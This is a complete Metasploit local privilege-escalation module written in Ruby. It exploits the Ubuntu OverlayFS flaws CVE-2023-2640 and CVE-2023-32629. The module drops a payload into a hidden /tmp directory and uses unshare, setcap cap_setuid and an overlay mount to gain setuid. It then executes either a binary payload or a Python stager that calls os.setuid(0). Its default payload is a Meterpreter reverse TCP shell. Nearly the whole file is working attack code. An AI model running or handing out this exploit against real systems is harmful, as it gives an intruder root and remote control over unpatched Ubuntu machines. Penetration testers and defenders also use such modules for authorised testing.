##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking
  include Msf::Exploit::FileDropper
  include Msf::Post::File
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Ubuntu Server GameOverlayFS Privsec',
        'Description' => %q{
          This module will level up shell to root with 
          OverlayFS impel in kernel
          A lot of ubuntu server and desktop are vulnerable.
        },
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2023-2640'],
          ['CVE', '2023-32629'],
          ['URL', 'https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/'],
          ['URL', 'https://www.crowdstrike.com/blog/crowdstrike-discovers-new-container-exploit/'],
          ['URL', 'https://cloud.tencent.com/developer/article/2332548']
        ],
        'Author' => [
          'Esonhugh'
        ],
        'Targets' => [['Auto', {}]],
        'Platform' => ['linux', 'python'],
        'SessionTypes' => ['meterpreter', 'shell'],
        'DefaultOptions' => {
          'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp',
          'PrependSetuid' => true,
        },
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        },
      )
    )
    register_advanced_options [
                                OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp']),
                                OptBool.new('FORCE_PYTHON', [true, 'Using python based payload wrapper', false]),
                                OptBool.new('MetaCopy', [true, 'Use Metacopy when mounting.like CVE-2023-32629 way', true])
                              ]
  end

  def base_dir
    datastore['WritableDir'].to_s
  end

  def exploit
    print_status("Upgrading session ID: #{datastore['SESSION']}")

    platform = datastore['SESSION'] ? session.platform : 'linux'

    payload_data = payload

    vprint_status("Platform: #{platform}")

    if payload_data.blank?
      print_error("Unable to build a suitable payload.")
      return nil
    end

    random_dir_name = ".#{rand_text_alphanumeric(5)}"
    executable_path = "#{base_dir}/#{random_dir_name}"
    vprint_status("Generate tmp dir #{executable_path}")
    cmd_exec("mkdir -p #{executable_path}")
    if !directory?(executable_path)
      print_error("mkdir #{executable_path} failed")
      return nil
    end
    pwd_store = pwd
    register_dir_for_cleanup(executable_path)
    cd(executable_path)
    vprint_status("Change Dir to #{pwd}")


    if datastore['FORCE_PYTHON']
      platform = 'python'
    end
    case platform
    when 'linux'
      vprint_status('Transfer method: Bourne shell [fallback]')
      rb = "#{executable_path}/l/basher"
      # exe = Msf::Util::EXE.to_executable(framework, larch, platform, payload_data)
      exe = generate_payload_exe
      vprint_status("mkdir with overlay fs")
      cmd_exec("mkdir u l w m")
      vprint_status("upload shellloader #{rb}")
      upload_and_chmodx(rb, exe)
      chmod(rb, perm = 0o755)
      vprint_status("exploiting ...")
      if datastore['MetaCopy']
        cmd_exec("unshare -rm sh -c \"setcap cap_setuid+eip l/basher;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w,metacopy=on m && touch m/*;\"")
      else
        cmd_exec("unshare -rm sh -c \"setcap cap_setuid+eip l/basher;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w, m && touch m/*;\"")
      end
      # aborted = transmit_payload(exe, platform)
      cmd_exec("u/basher")
    when 'python'
      vprint_status('Transfer method: Python')
      vprint_status("mkdir with overlay fs")
      cmd_exec("mkdir u l w m")
      vprint_status("copy python as interpreter")
      cmd_exec("cp `which #{remote_python_binary}` l/bash")
      vprint_status("exploiting ...")
      if datastore['MetaCopy']
        cmd_exec("unshare -rm sh -c \"setcap cap_setuid+eip l/bash;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w,metacopy=on m && touch m/*;\"")
      else
        cmd_exec("unshare -rm sh -c \"setcap cap_setuid+eip l/bash;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w, m && touch m/*;\"")
      end
      privsec_payload = "import os;os.setuid(0);#{generate_python_payload}"
      vprint_status("Sending Python stager: \"#{privsec_payload}\"")
      cmd_exec("u/bash -c \"#{privsec_payload}\" ")
    else
      vprint_status("Bad platform #{platform}")
    end

    cd(pwd_store)
    nil
  end
  def generate_python_payload(opts={})
    exe_init_options(opts)

    pl = opts[:code]
    pl ||= payload.encoded

    opts[:arch] = [opts[:arch]] unless opts[:arch].kind_of? Array
    # Fall back to x86...
    opts[:arch] = [ARCH_X86] if !opts[:arch] || opts[:arch].length < 1
    # Ensure we have an array

    # Transform the PlatformList
    if opts[:platform].kind_of? Msf::Module::PlatformList
      opts[:platform] = opts[:platform].platforms
    end


    exe = Msf::Util::EXE.to_python_reflection(framework, opts[:arch][0], pl, opts)


    unless exe
      raise Msf::NoCompatiblePayloadError, "Failed to generate an executable payload due to an invalid platform or arch."
    end

    exe_post_generation(opts)
    exe
  end

  def rand_text_alphanumeric(length)
    Rex::Text.rand_text_alpha(length)
  end

  def remote_python_binary
    return @remote_python_binary if defined?(@remote_python_binary)

    python_exists_regex = /Python (2|3)\.(\d)/

    if cmd_exec('python3 -V 2>&1') =~ python_exists_regex
      @remote_python_binary = 'python3'
    elsif cmd_exec('python -V 2>&1') =~ python_exists_regex
      @remote_python_binary = 'python'
    elsif cmd_exec('python2 -V 2>&1') =~ python_exists_regex
      @remote_python_binary = 'python2'
    else
      @remote_python_binary = nil
    end

    @remote_python_binary
  end
end

